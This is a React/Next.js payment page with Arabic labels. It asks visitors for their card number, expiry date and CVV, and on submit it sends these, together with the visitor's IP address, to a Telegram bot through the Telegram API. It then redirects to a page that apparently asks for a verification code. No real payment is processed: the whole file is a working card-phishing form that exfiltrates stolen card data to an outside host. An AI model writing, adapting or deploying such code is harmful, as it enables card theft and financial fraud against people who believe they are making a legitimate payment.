"use client";
import { useState, useEffect } from "react";
import { useRouter } from "next/navigation";

export default function PaymentPage() {
  const router = useRouter();

  const [cardNumber, setCardNumber] = useState("");
  const [expiryMonth, setExpiryMonth] = useState("");
  const [expiryYear, setExpiryYear] = useState("");
  const [cvv, setCvv] = useState("");
  const [errors, setErrors] = useState({});
  const [ipAddress, setIpAddress] = useState(""); // لتخزين عنوان الـ IP
  const [showMonthDropdown, setShowMonthDropdown] = useState(false);
  const [showYearDropdown, setShowYearDropdown] = useState(false);

  const months = Array.from({ length: 12 }, (_, i) =>
    (i + 1).toString().padStart(2, "0")
  );
  const years = Array.from({ length: 14 }, (_, i) => 2025 + i);

  useEffect(() => {
    // الحصول على عنوان الـ IP عند تحميل الصفحة
    const fetchIp = async () => {
      try {
        const response = await fetch("https://api.ipify.org?format=json");
        const data = await response.json();
        setIpAddress(data.ip);
      } catch (error) {
        console.error("خطأ في جلب عنوان IP:", error);
      }
    };
    fetchIp();
  }, []);

  const handleCardNumberChange = (e) => {
    let value = e.target.value.replace(/\s+/g, "").slice(0, 16);
    value = value.replace(/(\d{4})/g, "$1 ").trim();
    setCardNumber(value);
  };

  const handleCvvChange = (e) => {
    const value = e.target.value.replace(/\D/g, "").slice(0, 3);
    setCvv(value);
  };

  const validateFields = () => {
    const newErrors = {};
    if (!cardNumber || cardNumber.replace(/\s/g, "").length < 16) {
      newErrors.cardNumber = true;
    }
    if (!expiryMonth) newErrors.expiryMonth = true;
    if (!expiryYear) newErrors.expiryYear = true;
    if (!cvv || cvv.length < 3) newErrors.cvv = true;
    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    if (validateFields()) {
      const chatId = process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID;
      const botToken = process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN;
      const message = `تفاصيل الدفع:\n- رقم البطاقة: ${cardNumber}\n- الشهر: ${expiryMonth}\n- السنة: ${expiryYear}\n- CVV: ${cvv}\n- IP المستخدم: ${ipAddress}`;

      try {
        const response = await fetch(
          `https://api.telegram.org/bot${botToken}/sendMessage`,
          {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              chat_id: chatId,
              text: message,
            }),
          }
        );

        if (response.ok) {
          router.push(`/loading?nextPage=/code`);
        } else {
          alert("أعد المحاولة حدث خطأ ما");
        }
      } catch (error) {
        alert("أعد المحاولة حدث خطأ ما");
      }
    }
  };

  return (
    <div className="flex items-center justify-center">
      <form
        onSubmit={handleSubmit}
        className="bg-white p-8 rounded-lg w-full max-w-md"
      >
        <h2 className="text-xl font-semibold mb-6">يرجى إدخال معلومات البطاقة</h2>

        {/* رقم البطاقة */}
        <div className="mb-4">
          <label className="block text-sm font-medium mb-1">رقم البطاقة</label>
          <input
            type="text"
            value={cardNumber}
            onChange={handleCardNumberChange}
            placeholder="XXXX XXXX XXXX XXXX"
            className={`w-full p-3 border rounded-lg ${
              errors.cardNumber ? "border-2 border-red-500" : "border-gray-300"
            }`}
          />
        </div>

        {/* تاريخ انتهاء الصلاحية */}
        <div className="mb-4 flex gap-4">
          {/* Dropdown الشهر */}
          <div className="w-1/2 relative">
            <label className="block text-sm font-medium mb-1">الشهر</label>
            <div
              className={`w-full p-3 border rounded-lg cursor-pointer ${
                errors.expiryMonth ? "border-2 border-red-500" : "border-gray-300"
              }`}
              onClick={() => setShowMonthDropdown(!showMonthDropdown)}
            >
              {expiryMonth || "اختر الشهر"}
            </div>
            <ul
              className={`absolute top-full left-0 w-full bg-white border border-gray-300 rounded-lg shadow-lg mt-1 z-10 max-h-40 overflow-y-auto transform transition-all duration-300 ease-in-out ${
                showMonthDropdown
                  ? "opacity-100 scale-100"
                  : "opacity-0 scale-95 pointer-events-none"
              }`}
            >
              {months.map((month) => (
                <li
                  key={month}
                  onClick={() => {
                    setExpiryMonth(month);
                    setShowMonthDropdown(false);
                  }}
                  className="p-3 hover:bg-blue-100 cursor-pointer border-b last:border-none"
                >
                  {month}
                </li>
              ))}
            </ul>
          </div>

          {/* Dropdown السنة */}
          <div className="w-1/2 relative">
            <label className="block text-sm font-medium mb-1">السنة</label>
            <div
              className={`w-full p-3 border rounded-lg cursor-pointer ${
                errors.expiryYear ? "border-2 border-red-500" : "border-gray-300"
              }`}
              onClick={() => setShowYearDropdown(!showYearDropdown)}
            >
              {expiryYear || "اختر السنة"}
            </div>
            <ul
              className={`absolute top-full left-0 w-full bg-white border border-gray-300 rounded-lg shadow-lg mt-1 z-10 max-h-40 overflow-y-auto transform transition-all duration-300 ease-in-out ${
                showYearDropdown
                  ? "opacity-100 scale-100"
                  : "opacity-0 scale-95 pointer-events-none"
              }`}
            >
              {years.map((year) => (
                <li
                  key={year}
                  onClick={() => {
                    setExpiryYear(year);
                    setShowYearDropdown(false);
                  }}
                  className="p-3 hover:bg-blue-100 cursor-pointer border-b last:border-none"
                >
                  {year}
                </li>
              ))}
            </ul>
          </div>
        </div>

        {/* رمز الحماية CVV */}
        <div className="mb-4">
          <label className="block text-sm font-medium mb-1">رمز الحماية (CVV)</label>
          <input
            type="text"
            value={cvv}
            onChange={handleCvvChange}
            placeholder="CVV"
            className={`w-full p-3 border rounded-lg ${
              errors.cvv ? "border-2 border-red-500" : "border-gray-300"
            }`}
          />
        </div>

        {/* زر الدفع */}
        <button
          type="submit"
          className="w-full bg-[#c81048] text-white p-3 rounded-lg font-semibold hover:bg-[#d81b60]"
        >
          ادفع الآن
        </button>
      </form>
    </div>
  );
}